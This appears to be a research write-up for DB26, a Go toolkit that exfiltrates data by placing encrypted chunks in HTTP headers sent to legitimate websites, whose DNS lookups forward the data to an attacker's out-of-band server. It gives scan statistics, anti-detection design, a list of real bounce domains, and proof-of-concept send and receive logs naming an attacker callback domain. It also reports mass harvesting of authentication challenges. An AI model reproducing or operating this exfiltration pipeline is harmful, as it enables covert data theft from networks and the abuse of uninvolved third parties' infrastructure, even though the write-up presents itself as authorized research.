# DB26: We Built a Complete DataBouncing Toolkit and Exfiltrated Data Through 11.5 Million Websites Without Touching DNS

## TL;DR

We built [DB26](https://github.com/Splinters-io/DB26), a Go toolkit that implements DataBouncing -- an indirect exfiltration technique where data is sent as HTTP headers to legitimate third-party websites, and those websites unknowingly forward the data via DNS lookups to an attacker-controlled server. The sender never touches DNS. The sender never contacts the receiver. The data travels through normal internet infrastructure.

We scanned 9.8 million subdomains, found 11.5 million domain+header pairs that bounce data, and successfully exfiltrated a file end-to-end through third-party infrastructure with byte-for-byte integrity verification. The toolkit is open source.

## What is DataBouncing?

DataBouncing was created by [John Carroll](https://thecontractor.io/data-bouncing/) and [David Mound](https://databouncing.io). The original concept and Nick Dunn's [first tooling](https://github.com/N1ckDunn/DataBouncing) proved that web servers, CDNs, proxies, and WAFs will resolve hostnames found in HTTP headers like `Host`, `X-Forwarded-For`, and `Referer`.

**This is NOT DNS exfiltration.** The critical distinction:

1. The sender makes a normal **HTTP/HTTPS request** (TCP) to a legitimate third-party domain like `adobe.com`
2. The request contains data encoded as a subdomain in HTTP headers: `Host: data.your-oob-server.com`
3. The third party's infrastructure **processes the header** and resolves the hostname -- generating a **DNS query** (UDP) as a side effect
4. That DNS query arrives at your OOB server carrying the data

The protocol transition is the whole point: **TCP/HTTPS in, UDP/DNS out, through an unwitting third party**. The sender never generates a DNS query. The sender never contacts the receiver directly. To any network observer, the sender is just making HTTPS requests to well-known websites.

```
SENDER                          THIRD PARTY                    RECEIVER
  │                               │                              │
  │──HTTPS──(data in headers)───▶ │                              │
  │  Normal web request to        │──DNS query──(resolves ──────▶│
  │  a trusted domain             │  hostname in header)         │
  │                               │                              │
  │  TCP to adobe.com             │  UDP to oob.attacker.com    │
  │  Looks completely normal      │  Third party did this,      │ Reads data
  │                               │  not the sender             │ from DNS log
```

## What We Built

DB26 is a complete Go implementation with three core tools:

**Recruiter** -- Scans millions of domains to find which ones will bounce data. Sends HTTP requests with OOB subdomains in 15 different header positions and monitors for DNS callbacks. Output: a list of proven domain+header pairs.

**Sender** -- Takes a file, encrypts it (AES-256-GCM, Argon2id KDF), chunks it into DNS-label-sized pieces, and bounces each chunk through proven candidates from the recruiter. Each chunk is sent as shuffled subdomain labels with decoy fields injected, through a randomly selected domain using a randomly selected proven header position.

**Receiver** -- Parses the OOB server log, finds chunks by correlation ID, deshuffles the field order (using the shared key to determine field lengths), strips decoys, reassembles in sequence order, decrypts, and verifies the SHA-256 checksum.

## The Campaign

### Phase 1: Target Enumeration

Starting corpus: **Tranco Top 1 Million** domains.

We ran [Subfinder](https://github.com/projectdiscovery/subfinder) against root domains to enumerate subdomains. This ran in iterative batches, deduplicating between rounds:

| Batch | Subdomains Found | Delta |
|-------|-----------------|-------|
| Batch 1 | 1,270,807 | -- |
| Batch 2 | 2,124,802 | +853,995 |
| Batch 3 | 5,209,939 | +3,085,137 |
| Batch 4 | 9,104,007 | +3,894,068 |
| Final | 9,781,028 | +677,021 |

**Final target corpus: 9,781,028 unique subdomains** across thousands of root domains.

### Phase 2: Recruiter Scanning

We ran 8 recruiter campaigns across the full corpus, testing both NTLM and Basic auth modes, with increasing target sets as subfinder delivered new batches.

| Run | Targets | Probes Sent | DNS Callbacks | Candidates Found | Duration |
|-----|---------|-------------|---------------|-----------------|----------|
| NTLM subs | batch 1 | -- | -- | 1,239,031 | -- |
| Basic subs | batch 1 | -- | -- | 1,242,841 | -- |
| NTLM fresh | batch 2 | 4,249,604 | 18,645,508 | 2,205,088 | 1h41m |
| Basic fresh | batch 2 | 4,249,604 | 18,834,431 | 2,204,524 | 1h39m |
| NTLM delta3 | batch 3 delta | 6,170,274 | 28,074,251 | 3,225,991 | 2h24m |
| Basic delta3 | batch 3 delta | 6,170,274 | 28,125,399 | 3,224,617 | 2h25m |
| Responder delta4 | batch 4 delta | 7,788,112 | 34,635,652 | 4,064,030 | 3h0m |
| Final corpus | final delta | 1,354,042 | 5,405,067 | 674,627 | 35m |

**Aggregate totals:**

| Metric | Value |
|--------|-------|
| Total HTTP/HTTPS probes sent | 29,982,910 |
| Total DNS callbacks received | 133,732,424 |
| Unique proven domain+header pairs | 11,479,375 |
| Sustained throughput | ~700 probes/sec |
| Auth challenges captured (NTLM) | 2,534,055 |
| Auth challenges captured (Basic) | 1,426,596 |
| Total auth captures | 3,960,651 |

**11.5 million websites will unknowingly forward data on your behalf.** Each one was individually proven -- the recruiter only counts a domain+header pair as a candidate if a DNS callback was actually observed.

The callback amplification ratio is roughly **4.5x** -- for every probe sent, we received ~4.5 DNS callbacks on average. This is because a single HTTP request containing an OOB subdomain in the Host header often triggers multiple DNS lookups (A, AAAA, NS, etc.) from different resolvers in the target's infrastructure.

### Phase 3: End-to-End Proof of Concept

With proven candidates in hand, we ran the full exfiltration pipeline:

1. Created a test file (554 bytes)
2. Encrypted with AES-256-GCM (Argon2id-derived key)
3. Chunked into DNS-label-sized pieces
4. Sent each chunk through randomly selected proven candidates with:
   - Shuffled field order (24 possible permutations)
   - Decoy label injection (20% rate)
   - Random jitter between sends
   - Random header position per send
5. Collected DNS callbacks from interactsh server log
6. Deshuffled, stripped decoys, reassembled, decrypted
7. **Verified SHA-256 checksum: byte-for-byte identical to original**

The file was successfully exfiltrated through third-party internet infrastructure with zero data loss and zero direct connection between sender and receiver.

### Exfiltration Capacity

Each proven candidate can carry one chunk per use (to avoid creating a detectable pattern of repeated queries to the same domain). With 11.5 million candidates:

| Scenario | Capacity |
|----------|----------|
| Single use (1 chunk per candidate) | ~246 MB |
| 10x redundancy for reliability | ~25 MB |
| 100x redundancy (paranoid mode) | ~2.5 MB |

These numbers assume ~21 usable bytes per DNS label after encoding overhead. Real-world capacity depends on how many candidates you want to burn per exfiltration.

## Anti-Detection

The wire format is designed to resist static analysis:

- **No fixed format** -- Field order is shuffled across 24 permutations per chunk
- **Session-variable field lengths** -- Derived from the encryption key via Argon2id, so each session has a unique packet structure
- **Decoy labels** -- Random data injected at random positions (configurable rate)
- **AES-256-GCM encryption** -- Payload is indistinguishable from random
- **Random candidate selection** -- No repeated domain access pattern
- **Random header selection** -- Different injection position each time
- **Randomised send order** -- Chunks sent out of sequence
- **Random jitter** -- No timing signature

To an observer, the sender is making HTTPS requests to random popular websites with slightly unusual headers. The DNS side sees random-looking subdomain queries arriving from thousands of different resolver IPs worldwide -- the resolvers of the third-party infrastructure, not the sender.

## Observations

**What bounces:** CDNs, reverse proxies, WAFs, load balancers, and any infrastructure that resolves hostnames in HTTP headers. The `Host` header is by far the most effective, but `X-Forwarded-For`, `Referer`, `X-Wap-Profile`, and others all produce callbacks from certain targets.

**Auth captures are a bonus:** 3.9 million auth challenges (NTLM + Basic) were observed during scanning. These are servers that respond with `WWW-Authenticate` headers, revealing internal infrastructure details (domain names, server names) through NTLM challenge responses. This wasn't the goal, but it's a significant intelligence byproduct.

**Callback amplification:** A single HTTP request typically generates 4-5 DNS lookups as the third party's resolver infrastructure queries A, AAAA, NS, and sometimes TXT/SOA records. This means each chunk has multiple delivery attempts built in for free.

**The internet is porous:** Nearly 12% of the 9.8M subdomains we tested will resolve arbitrary hostnames from HTTP headers. This isn't a vulnerability in any individual service -- it's normal, expected behaviour of web infrastructure. DataBouncing just exploits it systematically.

## The Toolkit

DB26 is open source: [github.com/Splinters-io/DB26](https://github.com/Splinters-io/DB26)

Built in Go. Requires a self-hosted [Interactsh](https://github.com/projectdiscovery/interactsh) server (or any OOB DNS server you control). Includes recruiter, sender, receiver, polyglot responder, auth trap, web dashboard, and report generator.

## Credits

- DataBouncing created by [John Carroll](https://thecontractor.io/data-bouncing/) and [David Mound](https://databouncing.io)
- First public tooling by [Nick Dunn](https://github.com/N1ckDunn/DataBouncing)
- DB26 is the first complete Go implementation with end-to-end encryption and automated candidate discovery at scale

## Raw Data

Sample data from the campaign is in [`data/samples/`](data/samples/):

### Proven Candidates ([sample](data/samples/proven_candidates_sample.jsonl))

Domains that will bounce data through HTTP header processing. Each entry is a domain + the header positions proven to trigger DNS callbacks:

```json
{"domain": "brave.com", "headers": ["host"]}
{"domain": "cloudflare-dns.com", "headers": ["host"]}
{"domain": "kickstarter.com", "headers": ["host"]}
{"domain": "samsung.com", "headers": ["host"]}
{"domain": "bankofamerica.com", "headers": ["host"]}
```

The full dataset contains 11,479,375 entries. The sample shows 50 domains from the proven candidates list.

### POC Send Log ([sample](data/samples/poc_send_log_sample.jsonl))

Every chunk sent during the proof-of-concept exfiltration is logged with the target domain, header used, chunk sequence, and correlation ID:

```json
{
  "timestamp": "2026-03-21T16:31:06.939897783Z",
  "file_id": "e1ba",
  "chunk_seq": 3,
  "total_chunks": 25,
  "domain": "85-62-172-10.static.abi.orange.es",
  "header_name": "Host",
  "header_prefix": "host",
  "oob_domain": "oob.dboz.uk",
  "corr_id": "d6vcfg5mnc365rcfofp0tq1iaargqao8b"
}
```

Note: chunks are sent in random order (chunk 3 first, then 15, 22, 19...) through random candidates.

### POC Sender Output ([full](data/samples/poc_send_output.txt))

```
  Input:          message.txt (554 bytes)
  Encrypted:      582 bytes
  FileID:         e1ba
  Chunks:         25 x 25 bytes max

  Candidates:     500 domains, 500 channels
  OOB domains:    [oob.dboz.uk]
  Retries:        10x per chunk
  Decoy rate:     20%

  Sending 25 chunks x 10 retries = 250 requests

  [250/250] 100% at 1/s | errors: 0

  Send Complete
  File:       message.txt (554 bytes)
  Chunks:     25 (sent 250 total with retries)
  Errors:     0
  Duration:   3m32s
  Checksum:   af850616b64645e361c255740ac50c63e1ac1c65105810b3bb8cf31d7dbd76b8
```

### POC Receiver Output ([full](data/samples/poc_recv_output.txt))

```
  [*] Session key derived
  [*] Field lengths: fileID=5, seq=6, total=11
  [+] New file detected: e1ba (25 total chunks)
  [+] File e1ba complete! (25/25 chunks)

  Log parsing complete: 66571 lines, 13150 matched, 553 decoded

  File e1ba
  Chunks:    25 / 25
  Size:      554 bytes
  Checksum:  af850616b64645e3 (VERIFIED)
  Resolvers: 24 unique IPs
  Status:    SUCCESS
```

24 unique resolver IPs, all Cloudflare WARP nodes in London -- the data bounced through Cloudflare's infrastructure, not directly from the sender.

### Run Summaries ([all runs](data/samples/run_summaries.txt))

Summary JSON from each recruiter campaign, showing probes sent, callbacks received, candidates found, and auth captures.

### Candidate Discovery Sample

The recruiter's JSONL output records each proven domain with callback counts and header breakdown:

```json
{"domain":"hrw.suggest.hackerrank.com","callbacks":1,"headers":{"host":1}}
{"domain":"jup1755-prod.advertiser-mastertag.awin.com","callbacks":1,"headers":{"host":1}}
```

---

*For authorized security research and penetration testing only. Only use against systems you have explicit permission to test.*
